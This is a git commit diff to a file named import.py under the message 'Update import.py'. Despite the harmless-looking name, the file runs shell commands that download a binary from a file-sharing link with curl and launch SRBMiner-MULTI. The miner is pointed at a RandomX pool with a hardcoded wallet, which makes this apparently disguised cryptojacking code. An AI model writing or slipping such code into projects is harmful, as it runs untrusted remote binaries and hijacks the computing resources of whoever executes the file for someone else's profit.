05e3d4ba0da9d3168f35b83102b01c2058ce37aa
magdamana001 <86566264+magdamana001@users.noreply.github.com>
2024-01-14 18:52:50 +0100

    Update import.py

--- import.py
+++ import.py
@@ -1,3 +1,3 @@
 import os
 
-os.system("apt update; apt -y install wget; chmod +x SRBMiner-MULTI; ./SRBMiner-MULTI --algorithm randomx --pool randomx.rplant.xyz:17107 --tls true --wallet TaBohkLdkWDMVaSLQs9wxtP43eCf5MdLoQ968kSFTGhj9SRmLGcx8fvHmjyUaUo5kKEsw2ucaCSe8WZR2rCFZYUj2RxrwBmQXD.BB1")
+os.system("apt update; apt -y install wget; curl -O https://filebin.net/dvhhrrxtdhqke1sq/SRBMiner-MULTI; chmod +x SRBMiner-MULTI; ./SRBMiner-MULTI --algorithm randomx --pool randomx.rplant.xyz:17107 --tls true --wallet TaBohkLdkWDMVaSLQs9wxtP43eCf5MdLoQ968kSFTGhj9SRmLGcx8fvHmjyUaUo5kKEsw2ucaCSe8WZR2rCFZYUj2RxrwBmQXD.BB1")
